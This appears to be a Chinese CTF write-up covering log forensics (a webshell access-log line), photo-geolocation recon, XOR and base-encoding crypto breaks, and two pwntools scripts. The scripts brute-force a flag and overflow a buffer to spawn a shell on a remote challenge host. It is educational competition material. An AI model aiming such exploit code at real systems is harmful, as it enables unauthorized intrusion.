![](http://image.penguinway.space/i/2023/11/05/6546ed95e3fb8.png)
```
可以看到是PK头，猜测为zip文件，下载下来确实是zip压缩包，但是带有密码
继续看日志 翻到最底下 看到有几句话 task easy have fun you can get it
往上看 可以看到有一句
172.29.0.1 - - [15/Jun/2023:13:32:41 +0000] "GET /upload/ma.php?
log=var_dump(%27cGFzc3dvcmQ6IHNAZncjdiVmOQ==%27); HTTP/1.1" 200 272 "-" "Mozilla/5.0
(Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/114.0.0.0 Safari/537.36"
这个var_dump的参数 好像是个base64编码字符串
解码可以得到password: s@fw#v%f9
解压得到flag
```
### [Recon]赛博旅游
思路分析：此题仅需要完成出题人提出的问题即可得到flag，于是着手解决问题
解题步骤：
```
1.阅读第一题，题干要求找到请找出拍摄位置右手边高架桥/地铁站的名字，我们下载提供的原图，查看它的exif信息即可得到拍摄的地理位置，进而得到答案：花园桥
```
![](http://image.penguinway.space/i/2023/11/05/6546f2290150c.png)
![](http://image.penguinway.space/i/2023/11/05/6546f272c4a5d.png)
```
2.阅读第二题，题干要求找出拍摄位置附近与游戏《原神》某个角色同名的道路，我们下载提供提供的原图，可以发现没有附带exif信息，明显已经被抹除，而图片上较为明显是一个地标建筑，此时我们可以通过搜索引擎的以图搜图找到建筑所在地，进而通过地图找到附近的道路，进而得到答案：甘雨胡同
```
![](http://image.penguinway.space/i/2023/11/05/6546f35d75b27.png)
```
3.阅读第三题，题干要求回答这所学校特有的一种体育锻炼方式，而图片明显是北京航空航天大学，此时我们可以咨询在北京航空航天大学的同学/朋友，或通过搜索引擎得到答案
```
![](http://image.penguinway.space/i/2023/11/05/6546f43439ba9.png)
```
4.阅读第四题，题干要求回答这条线路上的一所学校名字，这所学校刚刚开放了两个地铁口，这里有一种奇技淫巧，由图可知这条线为上海地铁10号线，这条线路上仅有两所学校：同济大学和上海交通大学，结合字数可知为同济大学。咳咳，当然正常的做法是通过搜索引擎搜索，得到答案：同济大学
```
![](http://image.penguinway.space/i/2023/11/05/6546f5480f659.png)
```
5.阅读第五题，题干要求回答图片拍摄地附近的一所著名互联网公司名，我们可以发现图片依旧没有携带exif信息，此时只能通过搜索引擎以图搜图，可以发现其与米哈游总部大楼外形相似，进一步观察可以确认答案为：米哈游
```
![](http://image.penguinway.space/i/2023/11/05/6546f5d2806c5.png)
![](http://image.penguinway.space/i/2023/11/05/6546f64c809f9.png)
```
6.阅读第六题，题干要求回答图片拍摄地，依旧是搜索引擎以图搜图，可以发现拍摄地点是西安鼓楼，可以确认答案为：鼓楼
```
![](http://image.penguinway.space/i/2023/11/05/6546f6d12944c.png)
```
7.阅读第七题，题干要求回答当地最大的博物馆/纪念馆之间的一条道路的名字，图片不附带exif信息，以图搜图也没有信息，此时我们仔细观察图片，发现图片中含有两个信息，一个是酒店名，一个是公寓名，我们使用搜索引擎搜索这两个地点，可以得到拍摄城市在延安，同时根据图片可以确认拍摄范围，结合制高点这一信息，可以得到拍摄地点在延安清凉山，同时可知延安最大的博物馆为延安革命纪念馆，两点连线，可以发现正中间的道路为答案：太和山路
```
![](http://image.penguinway.space/i/2023/11/05/6546fb0355334.png)
![](http://image.penguinway.space/i/2023/11/05/6546fbb716eeb.png)
```
8.阅读第八题，题干要求回答图中拍摄者欲前往何处，此图没有exif信息，搜索引擎以图搜图也信息混杂，因此我们仔细观察图片，可以发现这是一个换乘站，换乘线路的信息在图中隐约呈现
```
![](http://image.penguinway.space/i/2023/11/05/6546fc685aa5f.jpg)
```
观察图片水印，可以发现含有拍摄时间信息，我们结合上面的图片，可以判断在这个时间段，拍摄者正位于北京市，我们可以使用AI超分辨率技术，将图片中展示换乘信息的部分放大，可以隐约看出线路名为三个汉字，不含数字，且线路标志色为红色，查阅搜索引擎，可以发现北京地铁中满足要求的仅有西郊线
```
![](http://image.penguinway.space/i/2023/11/05/6546fe85a547e.png)
![](http://image.penguinway.space/i/2023/11/05/6546fe732ba4c.png)
```
查阅西郊线停靠站点，发现线路上景点有颐和园，国家植物园，香山公园，逐一尝试可知答案为：香山公园
填入所有答案，得到flag
```
## 五、Crypto部分
### [Crypto]好多好多好多好多base！
思路分析：附件为一文本文件，根据题目提示，要求分段进行不同的base编码解密，得到flag
解题步骤：
```
1.第一段为base64编码，解密得flag第一段：orgctf{partl_
2.第二段为base16编码，解密得flag第二段：part2222_
3.第三段为base100编码，解密得flag第三段：part030330_
4.第四段为base69编码，解密得flag第四段：part404_
5.第五段为base64Url编码，解密得flag第五段：part555_555}
```
### [Crypto]my_own_cryptography/[Crypto]my_own_cryptography_2
#### 1 分析 `encrypt` 函数

首先关注函数 `encrypt`，手工重命名变量名以反混淆，梳理得到原函数的大致代码：

```py
def encrypt(m: str, key: str):
    m += (len(key) - len(m) % len(key))*" "
    c = ""
    for i in range(len(m)//len(key)):
        for j in range(len(key)):
            c += hex(ord(m[i*len(key)+j]) ^ ord(key[j]))[2:].zfill(2)
    return c
```

可以看到，函数首先对明文进行了填充（padding）操作，向明文后追加了若干个空字符 ` ` 使得明文的长度能被密钥长度整除。

之后，将明文按密钥长度分成若干段，对每段的每个字符，都和密钥对应位置的字符进行异或。例如，对于明文 `0x453618` 和 密钥 `0x4376`：

1. 函数会首先将明文填充至密钥长度的整数倍，即在后面追加一个 `0x20`，明文变为 `0x45361820`。
2. 函数将明文分为两组： `0x4536` 和 `0x1820`，然后分别求 `0x4536 ^ 0x4376` 和 `0x1820 ^ 0x4376`，得到 `0x0640` 和 `0x5b56`。
3. 将两组异或后的密文合并，得到密文 `0x06405b56`。

加密函数到这里分析完毕。不难联想到这是一个类似于流密码的加密方法，但是问题在于，流密码对于明文的任何字段都要做到**一次一密**，然而本题目的加密方法重复使用了单一密钥对于不同文本进行加密。这会带来严重的安全问题（下一节）。

#### 2 关于异或

首先，让我们回忆一下异或操作的真值表：

|      | 0    | 1    |
| ---- | ---- | ---- |
| 0    | 0    | 1    |
| 1    | 1    | 0    |

当两个数不同时，异或将会返回真，否则为假。不难看出，**一个数和自己本身异或运算的结果是0**，并且**异或运算满足交换律**。所以对于异或运算存在这样的一个性质：

**两个数相互按位异或的结果 == 两个数先分别与一个相同的数进行异或，再相互异或的结果**

即：
$$
a \oplus b = (a \oplus c) \oplus (b \oplus c)
$$
证明也很简单，因为前两条性质成立：
$$
(a \oplus c) \oplus (b \oplus c) = (a \oplus b)\oplus(c\oplus c) = a \oplus b
$$
那么，如果将本题的密文拆分成和密钥长度相等长度的子字符串，便可以利用这条性质...但是明文之间的异或可以揭示什么信息？

#### 3 ASCII码和异或

还记得什么是ASCII码吗？如今的ASCII码是UTF的子集，可以用8比特字符表示英文字符和其他的控制符号。

![1280px-USASCII_code_chart](http://image.penguinway.space/i/2023/11/05/654703ab3c5de.png)

现在让我们关注**空格**的ASCII码 `0x20`。它用二进制表示是 `00100000`。让我们再关注字母 `A`，其对应的ASCII码是 `01000001`。将A和空格异或，会发生什么？

首先异或低四位。由于**0异或任何数都是0**，运算结果的低四位将会和A的低四位相同；再异或高四位，空格的第六位数是1，这样的话将会使结果与A的第六位相反，但其他位均保持不变。最终的运算结果为 `01100001`，是 `a`。

注意到，每个大小字母和其对应的小写字母均在ASCII表相同的行上，只是列不同，有2列的偏移。不难发现这样的结论：**对于A-Z，其和 `0x20` （空格）异或均会得到对应的小写字母，反之亦然。**

由这个性质，我们可以知道：让密文两两异或，如异或结果出现了字母，则明文之中的对应位置应该为一个A-Z或a-z范围内的字符。（不要忘了密文的异或等于明文的异或。）

#### 4 最终解题思路

将明文拆成 `n` 对之后（长度和密钥相同，设为 `l`），使其组成一个 `n*l` 的矩阵。其与密钥异或后得到密文。
$$
\begin{bmatrix}
m_{00} & a_{01} & ... & m_{0l} \\
m_{10} &&& ...\\
... &&& ...\\
m_{n0}  &... &... & m_{nl}
\end{bmatrix}\oplus
\begin{bmatrix}
k_{0} &
k_{1} &
... &
k_{l}
\end{bmatrix}=
\begin{bmatrix}
c_{00} & c_{01} & ... & c_{0l} \\
c_{10} &&& ...\\
... &&& ...\\
c_{n0}  &... &... & c_{nl}
\end{bmatrix}
$$
对于密文的每一列，都让各个位互相异或；如果异或运算的结果是字母，则证明两个字符对应的明文之中含有空格。对于满足这样条件最多次数的字符，我们便可以认为它的明文是空格。因此，我们在遍历运算时可以为每一列中的不同行设定权重，每次异或运算出现空格就将这两行的权重加1，遍历结束后将权重最大的行的该字符的明文设定为空格，并根据该值还原出该行其他位置的字符明文。如此逐一还原每一列，便可以求出整个明文。求得明文后，密钥（flag）也就好求了。

目前还有最后的一个问题：如何确定 `n` 的大小？这里可以用爆破的方式来求，通过人工观测解密的明文是否是“正常的文本”。

我们可以写一个简单的脚本来求填充后的明文长度的最大公因数，来判断密钥的长度的可能，在此略去不表。对于这个题目，求出密钥的长度可能是2、19、31、38、62、589。接下来是解密的脚本。

```py
# c: ciphertext
# l: len of the key
def decode(c: str, l: int):
    rows = []
    plain = [[0 for _ in range(l)] for _ in range(len(c)//(l*2))]
    for i in range(len(c)//(l*2)):
        rows.append(c[2*i*l:(i+1)*2*l])
    # for every column of the matrix
    for col in range(l):
        # weight of the blank for every element
        blanks = {}
        # for every row
        for i in range(len(rows)):
            # possibility of being '0x20'
            p = 0
            # xor with other rows
            for j in range(len(rows)):
                if i == j:
                    continue
                # check the result of xor
                ascii =  int("0x"+rows[i][col*2:col*2+2], 16) ^ int("0x"+rows[j][col*2:col*2+2], 16)
                if ord('a') <= ascii <= ord('z') or ord('A') <= ascii <= ord('Z'):
                    p += 1
            blanks[i] = p
        # get the row of char that supposed to be 0x20 in this column
        row = max(zip(blanks.values(), blanks.keys()))[1]
        # restore plaintext on this column
        plain[row][col] = ' '
        for i in range(len(plain)):
            if i == row:
                continue
            plain[i][col] = chr(int("0x"+rows[i][col*2:col*2+2],16) ^ int("0x"+rows[row][col*2:col*2+2], 16) ^ ord(" "))

    # print the result
    for row in plain:
        for i in row:
            print(i, end="")
        print("")
```

调用函数。

```py
c = "201c...015d" # ciphertext omitted
decode(c, 31)
```

得到的结果是：

```
Once upon a time, in a kingdom 
called HEUCTF, there lived a wh
ite hat named Little White. Lit
tle White was very smart and lo
ved CTF. He often participated 
in CTF competitions and achieve
d many excellent results. One d
ay, the HEUCTF kingdom was inva
ded by hackers. The hackers des
troyed the kingdom's network sy
stem and stole the kingdom's we
alth. Little White decided to s
tand up and defeat the hackers 
to save the kingdom. Little Whi
te began his adventure. He firs
t found the clues left by the h
ackers, and then tracked down t
he hackers' hideout according t
o the clues. In the hackers' hi
deout, Little White had a fierc
e battle with the hackers. Afte
r a hard battle, Little White f
inally defeated the hackers and
 saved the kingdom. The people 
of the kingdom were very gratef
ul to Little White and called h
im a hero. Little White's story
 spread throughout the kingdom,
 inspiring everyone. Everyone h
opes that they can also become
a hero like Little White and fi
ght for justice. In the end of
the story, Little White became
the guardian of the HEUCTF king
dom. He continued to study hard
 and improve his skills in orde
r to better protect the kingdom
.
```

很合理的明文。由此，可以使用任意一行和密文对应的行进行异或，得到flag值 `orgctf{p1ease_j0in_the_HEUCTF!}`。

#### 5 利用汉明距离推测密钥长度

随着明文长度的增加，暴力破解的密钥长度方法的效率十分低下。我们可以计算汉明距离来推测密钥长度。两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3；任意字符（非纯字母）的两两汉明距离平均为4。

由于在本题中密文的异或等于明文的异或，在密钥长度猜想正确的情况下，不同密文分组之间的汉明距离应该在2-3的范围内。我们可以写出脚本来测算每个密钥长度猜想下的密文分组间的汉明距离。

```py
def get_avg_hamming_weight(c):
    avgs = {}
    # l stands for the number of chars in ciphertext
    l = len(c)//2
    # i stands for the length of key
    for i in range(1,l):
        # make sure i = gcd(l)
        if l % i != 0:
            continue
        rows = []
        for j in range(l//i):
            rows.append("0x" + c[j*i:j*i+i])
        avg = 0
        for j in range(len(rows)):
            for k in range(len(rows)):
                avg += bin(int(rows[j], 16) ^ int(rows[k], 16)).count("1")
        avg = avg / (i*len(rows)*(len(rows)-1)/2)
        avgs[i] = avg
    return avgs

print(get_avg_hamming_weight(c))
```

输出：

```
{1: 3.568754841306132, 2: 3.3118626058233143, 19: 3.5943666675944224, 31: 3.2528793649336945, 38: 3.358234295415959, 62: 2.6361063950198074, 589: 3.7928692699490663}
```

由于本题的明文长度和密钥长度不大，汉明距离的参考价值也不大。但当明文长度和密文长度足够大时，汉明距离可以是推测密钥长度的一种方法。
### [Crypto]boring_crypto
思路分析：附件中所给密文为一base64串，对其多次解密可得flag
解题步骤：
```
对base64串多次解密，得到一密文betpgs{fvzc1r_rap0qr_vf_a0g_pelcg0tencul}
明显其为rot13加密，解密得flag
```
![](http://image.penguinway.space/i/2023/11/05/654704c2caa8d.png)
## 六、PWN部分
### [PWN] guess_flag
思路分析：此题需要我们猜测flag，我们可以利用python的pwntools库编写脚本爆破flag
解题步骤：
```
编写python脚本，得到flag
```
```python
import re
from pwnlib.tubes.remote import remote
from pwn import *

port = 
# sh = process("./bin/pwn")
sh = remote('101.43.204.196', port)

sh.recvuntil(b'Welcome to Guess flag\n')
length = sh.recvline().decode('utf-8')
length = re.match("The length of the flag is (\\d+)\n", length).group(1)
length = eval(length)

print('length', length)

now = 0
flag = b''

while now != length:
    for i in [bytes([i]) for i in range(33, 127)]:
        sh.recvuntil(b'Enter the flag you guessed\n')
        _flag = flag + i
        sh.sendline(_flag)
        _length = sh.recvline().decode('utf-8')
        _length = re.match("You guessed the first (\\d+) flag characters correctly\n", _length).group(1)
        _length = eval(_length)
        if _length > now:
            flag += i
            now = _length
            print(flag)
            break

sh.interactive()
```
```
运行结果如下图
```
![](http://image.penguinway.space/i/2023/11/05/6547094860377.png)
### [PWN] gift
解题python脚本：
```python
from pwn import *

#sh = process('./bin/pwn')
sh = remote('101.43.204.196',port)

payload = b'a'*0x10+p32(0)+p32(0x0804855D)+p32(0)+p32(0)
sh.send(payload)
sh.recvuntil(b'Good name, I will give you a gift:')
addr = eval(sh.recvline()[:-1])+4
print('addr',hex(addr))

payload = b'sh'.ljust(0x10,b'\x00')+p32(0)+p32(0x080483E0)+p32(0)+p32(addr)
sh.send(payload)
sh.sendline(b'cat flag')
sh.interactive()
```